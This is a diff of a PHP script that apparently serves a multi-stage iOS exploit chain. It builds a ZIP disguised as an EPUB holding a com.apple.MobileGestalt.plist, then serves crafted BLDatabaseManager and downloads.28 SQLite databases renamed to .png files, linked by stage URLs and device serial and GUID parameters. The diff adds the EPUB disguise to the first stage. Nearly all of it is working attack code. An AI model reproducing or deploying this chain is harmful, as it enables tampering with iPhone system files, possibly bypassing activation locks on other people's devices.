@@ -1,12 +1,12 @@
 <?php
 // Enable error reporting for debugging
 error_reporting(E_ALL);
-ini_set('display_errors', 0); // ← НЕ выводить ошибки в HTTP-ответ!
+ini_set('display_errors', 0); 
 
 function log_debug($msg, $level = 'INFO') {
     $timestamp = date('Y-m-d H:i:s');
     $line = "[$timestamp] [$level] $msg";
-    error_log($line); // ← Только в error_log (консоль/файл)
+    error_log($line); 
 }
 
 // Function to generate random directory name
@@ -97,10 +97,18 @@ if (!file_exists($plistPath)) {
 $realPlistPath = realpath($plistPath);
 log_debug("✅ Using plist: $realPlistPath (size: " . filesize($realPlistPath) . " bytes)");
 
-// --- Создание stage1 ---
+
 $randomName1 = generateRandomName();
 $firstStepDir = "$basePath/firststp/$randomName1";
 mkdir($firstStepDir, 0755, true);
+
+
+$cachesDir = "$firstStepDir/Caches";
+mkdir($cachesDir, 0755, true);
+
+
+$tmpMimetype = "$cachesDir/mimetype";
+file_put_contents($tmpMimetype, "application/epub+zip");
 
 $zipPath = "$firstStepDir/temp.zip";
 $zip = new ZipArchive();
@@ -110,19 +118,37 @@ if (!$zip->open($zipPath, ZipArchive::CREATE)) {
     echo json_encode(['success' => false, 'error' => 'ZIP creation failed']);
     exit;
 }
-$zip->addFile($plistPath, "Caches/com.apple.MobileGestalt.plist");
+
+
+if (!$zip->addFile($tmpMimetype, "Caches/mimetype")) {
+    log_debug("Failed to add mimetype to ZIP", "ERROR");
+    exit;
+}
+$zip->setCompressionName("Caches/mimetype", ZipArchive::CM_STORE); // ← КЛЮЧЕВО!
+
+// Добавляем plist в Caches/
+if (!$zip->addFile($plistPath, "Caches/com.apple.MobileGestalt.plist")) {
+    log_debug("Failed to add plist to ZIP", "ERROR");
+    exit;
+}
+
 $zip->close();
+
+
+unlink($tmpMimetype);
+rmdir($cachesDir);
+
 
 $fixedFilePath = "$firstStepDir/fixedfile";
 rename($zipPath, $fixedFilePath);
-log_debug("✅ fixedfile created: $fixedFilePath");
+log_debug("✅ fixedfile (EPUB-compliant) created: $fixedFilePath");
 
 // --- URLs ---
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] ? "https" : "http";
 $baseUrl = "$protocol://$_SERVER[HTTP_HOST]";
 $fixedFileUrl = "$baseUrl/firststp/$randomName1/fixedfile";
 
-// BLDatabaseManager
+// --- Stage2: BLDatabaseManager.sqlite → belliloveu.png ---
 $blDump = readSQLDump("$basePath/BLDatabaseManager.png");
 $blDump = str_replace('KEYOOOOOO', $fixedFileUrl, $blDump);
 
@@ -134,7 +160,7 @@ createSQLiteFromDump($blDump, $blSqlite);
 rename($blSqlite, "$secondStepDir/belliloveu.png");
 $blUrl = "$baseUrl/2ndd/$randomName2/belliloveu.png";
 
-// downloads.28
+// --- Stage3: downloads.28.sqlitedb → apllefuckedhhh.png ---
 $dlDump = readSQLDump("$basePath/downloads.28.png");
 $dlDump = str_replace('https://google.com', $blUrl, $dlDump);
 $dlDump = str_replace('GOODKEY', $guid, $dlDump);
@@ -149,7 +175,7 @@ $finalUrl = "$baseUrl/last/$randomName3/apllefuckedhhh.png";
 
 log_debug("✅ All stages generated.");
 
-// ✅ Только JSON в HTTP-ответ:
+
 echo json_encode([
     'success' => true,
     'parameters' => compact('prd', 'guid', 'sn'),
